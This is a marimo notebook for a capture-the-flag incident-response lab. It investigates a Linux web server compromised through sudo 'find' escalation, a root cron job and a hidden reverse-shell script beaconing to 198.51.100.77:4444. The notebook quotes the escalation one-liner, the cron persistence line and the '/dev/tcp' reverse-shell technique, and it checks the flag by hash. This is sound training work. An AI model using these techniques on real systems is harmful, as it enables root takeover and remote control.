import marimo

__generated_with = "0.24.1"
app = marimo.App()


@app.cell
def __():
    import hashlib
    import json
    import os
    from pathlib import Path
    import re
    import marimo as mo
    import pandas as pd

    return Path, hashlib, json, mo, os, pd, re


@app.cell
def __(Path, pd):
    # Locate base data directory across environments
    possible_roots = [
        Path("data"),
        Path("../data"),
        Path("/workspace/data"),
        Path("challenges/03-compromised-linux-server/data"),
    ]
    if "__file__" in globals():
        possible_roots.insert(0, Path(__file__).resolve().parent.parent / "data")

    data_root = next((p for p in possible_roots if p.exists()), Path("data"))

    # 1. Load bash history
    bash_file = data_root / "home" / "deploy" / ".bash_history"
    bash_lines = bash_file.read_text().splitlines() if bash_file.exists() else []
    df_bash = pd.DataFrame(
        [{"cmd_index": i + 1, "command": c} for i, c in enumerate(bash_lines)]
    )

    # 2. Load auth.log
    auth_file = data_root / "var" / "log" / "auth.log"
    auth_lines = auth_file.read_text().splitlines() if auth_file.exists() else []
    auth_records = []
    for line in auth_lines:
        auth_records.append({"raw_line": line})
    df_auth = pd.DataFrame(auth_records)

    # 3. Load cron persistence files
    cron_dir = data_root / "etc" / "cron.d"
    cron_entries = []
    if cron_dir.exists():
        for cf in sorted(cron_dir.glob("*")):
            cron_entries.append(
                {
                    "filename": cf.name,
                    "path": str(cf),
                    "schedule_content": cf.read_text().strip(),
                }
            )
    df_cron = pd.DataFrame(cron_entries)

    # 4. Load backdoor payload script
    backdoor_file = data_root / "opt" / "cert-tools" / ".sync.sh"
    backdoor_code = (
        backdoor_file.read_text()
        if backdoor_file.exists()
        else "Script file not found."
    )

    return (
        auth_file,
        auth_lines,
        auth_records,
        backdoor_code,
        backdoor_file,
        bash_file,
        bash_lines,
        cron_dir,
        cron_entries,
        data_root,
        df_auth,
        df_bash,
        df_cron,
        possible_roots,
    )


@app.cell
def __(mo):
    # Analyst Sidebar: Host Scope, MITRE ATT&CK & Checklist
    check_gtfobins = mo.ui.checkbox(
        label="1. Audit .bash_history for sudo escalation", value=False
    )
    check_auth = mo.ui.checkbox(
        label="2. Confirm root privilege transition in auth.log", value=False
    )
    check_cron = mo.ui.checkbox(
        label="3. Locate scheduled persistence in /etc/cron.d", value=False
    )
    check_backdoor = mo.ui.checkbox(
        label="4. Reverse engineer .sync.sh reverse shell", value=False
    )
    check_flag = mo.ui.checkbox(
        label="5. Extract containment flag & remediation plan", value=False
    )

    hints = mo.accordion(
        {
            "💡 Hint 1: Privilege Escalation": mo.md(
                "Inspect **Step 1 (`.bash_history`)**. Look for how the `deploy` user ran `sudo find`. Check [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) for why `find . -exec /bin/sh \\;` grants an unconstrained root shell."
            ),
            "💡 Hint 2: Scheduled Persistence": mo.md(
                "Inspect **Step 3 (`/etc/cron.d`)**. Check the file configured with `*/15 * * * * root`. What script does it execute every 15 minutes?"
            ),
            "💡 Hint 3: Hidden Script Dissection": mo.md(
                "Inspect **Step 4 (`/opt/cert-tools/.sync.sh`)**. The attacker disguised their reverse shell behind a dot-file (`.sync.sh`). The script connects back to an external listener and holds the incident flag."
            ),
        }
    )

    sidebar_content = mo.vstack(
        [
            mo.md("## 🐧 CyberLab IR Console"),
            mo.md("**Incident ID**: `INC-0303-LINUX-BREACH`"),
            mo.md("**Host**: `web-prod-04` (Ubuntu 22.04 LTS)"),
            mo.md("**Classification**: `TLP:AMBER` | Severity: **CRITICAL**"),
            mo.md("---"),
            mo.md("### 🎯 Investigation Checklist"),
            check_gtfobins,
            check_auth,
            check_cron,
            check_backdoor,
            check_flag,
            mo.md("---"),
            mo.md("### 🗺️ MITRE ATT&CK Matrix"),
            mo.md(
                "- **T1548.003**: Abuse Elevation Mechanism: Sudo\n"
                "- **T1053.003**: Scheduled Task/Job: Cron\n"
                "- **T1059.004**: Command & Scripting Interpreter: Unix Shell\n"
                "- **T1571**: Non-Standard Port (4444)"
            ),
            mo.md("---"),
            hints,
        ]
    )

    mo.sidebar(sidebar_content)
    return (
        check_auth,
        check_backdoor,
        check_cron,
        check_flag,
        check_gtfobins,
        hints,
        sidebar_content,
    )


@app.cell
def __(df_auth, df_bash, df_cron, mo):
    # Header Banner & Stat KPIs
    header_view = mo.vstack(
        [
            mo.md("""
            # 🐧 Incident 0303: Compromised Linux Server Forensics
            ### Host Incident Response, GTFOBins Sudo Escalation & Cron Persistence
            """),
            mo.callout(
                mo.md(
                    "**SOC Alert Notice**: Egress firewalls observed regular outbound TCP connections to an untrusted external IP (`198.51.100.77:4444`) on a strict 15-minute schedule originating from `web-prod-04`. Audit the `deploy` user's shell session, reconstruct how root access was obtained, locate the persistence mechanism, and recover the containment flag."
                ),
                kind="danger",
            ),
            mo.hstack(
                [
                    mo.stat(
                        value="web-prod-04",
                        label="Affected Host",
                        caption="Production Web Server",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_bash)} Commands",
                        label="Audited Shell Commands",
                        caption="deploy user bash history",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_auth)} Events",
                        label="Auth Log Records",
                        caption="/var/log/auth.log",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_cron)} Schedules",
                        label="Cron Configurations",
                        caption="/etc/cron.d Directory",
                        bordered=True,
                    ),
                    mo.stat(
                        value="15 Minutes",
                        label="Beacon Cadence",
                        caption="Periodic C2 Reverse Shell",
                        direction="increase",
                        bordered=True,
                    ),
                ],
                justify="start",
                gap=1,
            ),
        ]
    )
    header_view
    return (header_view,)


@app.cell
def __(mo):
    # Step 1: Shell History Search Control
    bash_search = mo.ui.text(
        placeholder="Filter shell commands (e.g., sudo)...",
        label="Search Bash History:",
    )
    return (bash_search,)


@app.cell
def __(bash_search, df_bash, mo):
    # Step 1: Filtered Bash History Display
    filtered_bash = df_bash
    if bash_search.value.strip():
        filtered_bash = df_bash[
            df_bash["command"].str.contains(
                bash_search.value.strip(), case=False, na=False
            )
        ]

    bash_table = mo.ui.table(
        filtered_bash,
        selection=None,
        pagination=True,
        page_size=12,
        show_column_summaries=False,
    )

    query = bash_search.value.strip().lower()
    if query and any(k in query for k in ["find", "sudo", "exec", "sh"]):
        gtfobins_alert = mo.callout(
            mo.md(
                "🚨 **PRIVILEGE ESCALATION PATTERN IDENTIFIED**: Review the command `sudo find . -exec /bin/sh \\;`.\n\n"
                "Because `find` was granted sudo permissions in `/etc/sudoers` without password authentication, invoking `-exec /bin/sh` yields an unconstrained root shell ([GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo))."
            ),
            kind="danger",
        )
    else:
        gtfobins_alert = mo.md("")

    step1_view = mo.vstack(
        [
            mo.md("## ⌨️ Step 1: Shell History Audit (`/home/deploy/.bash_history`)"),
            mo.md("### 🔍 Auditing `deploy` User Command History:"),
            bash_search,
            gtfobins_alert,
            bash_table,
        ]
    )
    step1_view
    return bash_table, filtered_bash, gtfobins_alert, query, step1_view


@app.cell
def __(mo):
    # Step 2: Auth Log Search Control
    auth_search = mo.ui.text(
        placeholder="Filter auth logs (e.g., sudo, COMMAND, session)...",
        label="Search Auth Log:",
    )
    return (auth_search,)


@app.cell
def __(auth_search, df_auth, mo):
    # Step 2: Filtered Auth Log Display
    filtered_auth = df_auth
    if auth_search.value.strip():
        filtered_auth = df_auth[
            df_auth["raw_line"].str.contains(
                auth_search.value.strip(), case=False, na=False
            )
        ]

    auth_table = mo.ui.table(
        filtered_auth,
        selection=None,
        pagination=True,
        page_size=12,
        show_column_summaries=False,
    )

    step2_view = mo.vstack(
        [
            mo.md("## 📜 Step 2: System Auth Logs (`/var/log/auth.log`)"),
            mo.md("### 🔍 Auditing Authentication and Elevation Events:"),
            auth_search,
            auth_table,
        ]
    )
    step2_view
    return auth_table, filtered_auth, step2_view


@app.cell
def __(df_cron, mo):
    # Step 3: Persistence Hunter (/etc/cron.d/)
    cron_rows = []
    for _, row in df_cron.iterrows():
        cron_rows.append(f"| `{row['filename']}` | `{row['schedule_content']}` |")
    cron_rows_str = "\n".join(cron_rows)

    cron_table = mo.md(f"""
        | Cron Configuration File | Schedule & Command Executed |
        | :--- | :--- |
        {cron_rows_str}
        """)

    cron_alert = mo.callout(
        mo.md(
            "⏰ **ROGUE CRON SCHEDULE IDENTIFIED**: `/etc/cron.d/cert-sync`\n\n"
            "```crontab\n*/15 * * * * root /opt/cert-tools/.sync.sh >/dev/null 2>&1\n```\n\n"
            "This configuration runs as `root` every 15 minutes, triggering the outbound beacon observed by firewalls."
        ),
        kind="danger",
    )

    step3_view = mo.vstack(
        [
            mo.md("## ⏰ Step 3: Scheduled Persistence Hunter (`/etc/cron.d/`)"),
            cron_alert,
            mo.md("### 🔍 All Scheduled Jobs in `/etc/cron.d/`:"),
            cron_table,
        ]
    )
    step3_view
    return cron_alert, cron_rows, cron_rows_str, cron_table, step3_view


@app.cell
def __(backdoor_code, backdoor_file, mo):
    # Step 4: Backdoor Payload Dissection
    backdoor_view = mo.vstack(
        [
            mo.md(
                f"## 🕵️ Step 4: Backdoor Payload Reverse Engineering (`{backdoor_file}`)"
            ),
            mo.md(
                "Notice that the filename starts with a dot (`.sync.sh`), hiding it from standard `ls` directory listings:"
            ),
            mo.md(f"```bash\n{backdoor_code}\n```"),
            mo.callout(
                mo.md(
                    "**Reverse Shell Analysis**:\n"
                    "- **Attacker IP**: `198.51.100.77`\n"
                    "- **Attacker Listener Port**: `4444`\n"
                    "- **Technique**: Interactive bash redirection (`bash -i >& /dev/tcp/... 0>&1`)\n"
                    "- **Privilege Context**: Runs as `root` via `/etc/cron.d/cert-sync`"
                ),
                kind="danger",
            ),
        ]
    )
    backdoor_view
    return (backdoor_view,)


@app.cell
def __(mo):
    # Step 5: Flag Verification Input Control
    candidate_flag = mo.ui.text(
        placeholder="FLAG{...}",
        label="Enter Extracted Persistence Flag to Verify:",
    )
    return (candidate_flag,)


@app.cell
def __(candidate_flag, hashlib, mo, re):
    val = candidate_flag.value.strip()
    target_hash = "f6e91506b2ce6db278733011060f103779bd018ce35c6076e9f36c0b841331d2"

    if not val:
        flag_feedback = mo.md(
            "Enter the flag discovered inside the backdoor script comment."
        )
        remediation_view = mo.md("🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*")
    elif hashlib.sha256(val.encode()).hexdigest() == target_hash:
        flag_feedback = mo.callout(
            mo.md(
                "🎉 **FLAG VERIFIED CORRECT!**\n\n"
                "Your recovered persistence flag is confirmed! Now submit this flag in the **Submit Flag** box in the left CyberLab portal pane to register your 100 points and Incident Response competency!"
            ),
            kind="success",
        )
        remediation_view = mo.vstack(
            [
                mo.md("### 🛡️ Confirmed Incident Response Remediation Checklist:"),
                mo.md("""
                | Action Item | Command / File Target | Priority |
                | :--- | :--- | :--- |
                | **1. Remove Cron Entry** | `rm /etc/cron.d/cert-sync` | `CRITICAL` |
                | **2. Delete Backdoor Script** | `rm /opt/cert-tools/.sync.sh` | `CRITICAL` |
                | **3. Terminate Active C2 Sockets** | `pkill -f '198.51.100.77'` | `HIGH` |
                | **4. Revoke Sudo Find** | `sed -i '/find/d' /etc/sudoers` | `HIGH` |
                | **5. Rotate deploy Credentials** | `passwd deploy` | `MEDIUM` |
                """),
            ]
        )
    elif re.match(r"^FLAG\{.*\}$", val):
        flag_feedback = mo.callout(
            mo.md(
                "❌ Incorrect flag. Inspect the comment inside `/opt/cert-tools/.sync.sh` in Step 4."
            ),
            kind="danger",
        )
        remediation_view = mo.md("🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*")
    else:
        flag_feedback = mo.callout(
            mo.md(
                "⚠️ Flag format invalid. Flags must begin with `FLAG{` and end with `}`."
            ),
            kind="warn",
        )
        remediation_view = mo.md("🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*")

    step5_view = mo.vstack(
        [
            mo.md("## 🏁 Step 5: Flag Verification & IR Remediation"),
            candidate_flag,
            flag_feedback,
            mo.md("---"),
            remediation_view,
        ]
    )
    step5_view
    return flag_feedback, remediation_view, step5_view, target_hash, val


if __name__ == "__main__":
    app.run()
